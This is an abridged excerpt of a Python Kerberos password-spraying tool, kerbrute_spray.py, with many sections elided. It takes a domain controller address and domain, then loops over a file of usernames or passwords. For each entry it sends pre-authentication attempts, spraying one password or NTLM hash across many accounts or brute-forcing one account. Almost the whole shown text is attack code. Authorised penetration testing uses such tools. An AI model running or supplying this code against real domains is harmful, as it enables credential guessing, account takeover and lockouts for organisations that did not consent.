...
def send_req_tcp(req, kdc, port=88):
    inet = detect_address_family(kdc)
    data = encode(req)
...
if __name__ == '__main__':
    if len(sys.argv)!=6:
        ...
        print('Use Kerberos pre-authentication to test either:')
        print('  1) A single password against a list of users')
        print('  2) A single user against a list of passwords')
        print()
        print('Reference:')
        ...
        print()
        print("Usage:")
        print("  kerbrute_spray.py <DC-IP> <domain> <file> <passwordtype> <data> <tcp|udp>")
    ...
    passwordtype = sys.argv[4]
    data_value = sys.argv[5]
    protocol = 'tcp'
    if len(sys.argv) > 6:
        protocol = sys.argv[6].lower()

    print('[*] DomainControlerAddr: %s'%(kdc_ip))
    print('[*] DomainName:          %s'%(user_realm))
    print('[*] File:                %s'%(file_path))

    # Open the provided file (user file OR password file depending on mode)
    file_object = open(file_path, 'r')
    p = subprocess.Popen(['wc', '-l', file_path], stdout=subprocess.PIPE)
    output = p.communicate()[0]
    total = output.split()[0]

    spry_fn = passwordspray_tcp
    if protocol == 'udp':
        spry_fn = passwordspray_udp
    ...
    if passwordtype in ['clearpassword', 'ntlmhash']:
        ...
        for user in file_object:
            username = user.strip()
            if username:
                logger.status("[{}/{}]: {}".format(i, total, username))
                spry_fn(user_realm, username, user_key, kdc_ip, data_value)
                i+=1

    # ------------------------------
    # MODE B - ONE USER -> MANY PASSWORDS  (FIXED)
    # ------------------------------
    elif passwordtype in ['pwdfile-clear', 'pwdfile-ntlm']:
        ...
        for password in file_object:
            pwd = password.strip()
            if pwd:
                logger.status("[{}/{}]: {}".format(i, total, password))
                key = pwd_key(pwd)
                passwordspray_tcp(user_realm, fixed_user, key, kdc_ip, pwd)
                i+=1
